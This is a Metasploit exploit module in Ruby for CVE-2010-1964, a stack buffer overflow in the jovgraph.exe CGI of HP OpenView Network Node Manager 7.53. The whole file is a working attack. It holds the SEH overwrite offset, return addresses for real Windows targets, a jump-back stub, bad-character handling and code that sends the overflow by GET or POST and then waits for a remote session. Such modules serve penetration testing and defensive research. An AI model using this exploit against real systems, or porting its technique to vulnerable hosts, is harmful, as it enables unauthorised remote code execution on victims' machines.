# $Id: hp_nnm_ovwebsnmpsrv_main.rb 12097 2011-03-23 15:45:48Z jduck $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GreatRanking
 
    HttpFingerPrint = { :method => &#039;HEAD&#039;, :uri => &#039;/OvCgi/jovgraph.exe&#039;, :pattern => /Hewlett-Packard Development Company/ }
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::Seh
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;HP OpenView Network Node Manager ovwebsnmpsrv.exe main Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53
                prior to NNM_01203. By specifying a long &#039;arg&#039; parameter when executing the &#039;jovgraph.exe&#039;
                CGI program, an attacker can cause a stack-based buffer overflow and execute arbitrary code.
 
                This vulnerability is triggerable via either a GET or POST request. The buffer being
                written to is 1024 bytes in size. It is important to note that this vulnerability must
                be exploited by overwriting SEH. Otherwise, CVE-2010-1961 is triggered!
 
                The vulnerable code is within the "main" function within "ovwebsnmpsrv.exe" with a
                timestamp prior to April 7th, 2010. There are no stack cookies, so exploitation is
                easily achieved by overwriting SEH structures.
 
                There exists some unreliability when running this exploit. It is not completely clear why
                at this time, but may be related to OVWDB or session management. Also, on some attempts
                OV NNM may report invalid characters in the URL. It is not clear what is causing this
                either.
            } ,
            &#039;Author&#039;         =>
                [
                    &#039;jduck&#039;   # Metasploit module
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: 12097 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2010-1964&#039; ],
                    [ &#039;OSVDB&#039;, &#039;65552&#039; ],
                    [ &#039;BID&#039;, &#039;40873&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-10-108/&#039; ],
                    [ &#039;URL&#039;, &#039;http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02217439&#039; ]
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                },
            &#039;Privileged&#039;     => false,
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 1024, # 1024 byte buffer..
                    # In addition to regular HTTP type bad chars, this one also has
                    # an issue with " since the buffer is being passed on the command line.
                    &#039;BadChars&#039; => "\x00\x09\x0a\x0b\x0c\x0d\x20\x22\x24\x2c\x3b\x60",
                    &#039;DisableNops&#039; => true,
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;HP OpenView Network Node Manager 7.53 w/NNM_01201&#039;,
                        {
                            &#039;Ret&#039;     => 0x5a02aadf, # pop edx/pop ebp/ret - in ov.dll (v1.30.10.9166)
                        }
                    ],
                    [ &#039;HP OpenView Network Node Manager 7.53 (Windows 2003)&#039;,
                        {
                            &#039;Ret&#039;     => 0x71c069dd, # pop edx/pop ecx/ret - in ws2_32.dll v5.2.3790.3959
                        }
                    ],
                    [ &#039;Debug Target&#039;,
                        {
                            &#039;Ret&#039;     => 0xdeadbeef, # crasher
                        }
                    ]
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;June 16 2010&#039;))
 
        register_options(
            [
                Opt::RPORT(80),
            ], self.class)
    end
 
    def exploit
 
        print_status("Trying target #{target.name}...")
 
        cgi = &#039;/OvCgi/jovgraph.exe&#039;
 
        # Any command line parameter will cause a buffer overflow.
 
        # "action" must be set
        action = rand_text_alphanumeric(1)
 
        # "sel" must be set
        sel = rand_text_alphanumeric(1)
 
        # "timestamp" cannot be set.
 
        # SEH
        seh_offset = 1132
        seh_frame = generate_seh_record(target.ret)
 
        # Jump back to the payload, after p/p/r jumps to us.
        distance = seh_offset + seh_frame.length
        distance -= 1  # skip the first byte (cannot be -/+)
        jmp_back = Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + distance.to_s).encode_string
 
        # Create the buffer
        buf = &#039;&#039;
        # The first character cannot be a - or a +
        buf << rand_text(1, payload_badchars + "+-")
        buf << payload.encoded
        buf << rand_text(seh_offset - buf.length)
        buf << seh_frame
        buf << jmp_back
 
        # Force an exception writing off the end of the stack
        buf << rand_text(6500 - buf.length)
 
        # Send the request
        if rand(2) > 0
            print_status("Sending exploit via POST request...")
            res = send_request_cgi({
                &#039;uri&#039;         => cgi,
                &#039;method&#039;      => "POST",
                &#039;vars_post&#039; =>
                    {
                        &#039;sel&#039; => sel,
                        &#039;act&#039; => action,
                        &#039;arg&#039; => buf
                    }
            }, 3)
        else
            print_status("Sending exploit via GET request...")
            res = send_request_cgi({
                &#039;uri&#039;         => cgi,
                &#039;method&#039;      => "GET",
                &#039;vars_get&#039; =>
                    {
                        &#039;sel&#039; => sel,
                        &#039;act&#039; => action,
                        &#039;arg&#039; => buf
                    }
            }, 3)
        end
 
        if not res
            raise RuntimeError, "Eek! We didn&#039;t get a response.. Exploiting this vuln should return one!"
        end
 
        print_status(res.body) if datastore["NNM_DEBUG"]
 
        if res.body =~ /graphing applet is being/
            print_status("We got the body we were looking for, the session should be coming any second.")
        else
            raise RuntimeError, "Eek, exploit likely failed. The body didn&#039;t contain what we expected."
        end
 
        handler
 
    end
 
    def wfs_delay
        5
    end
 
end



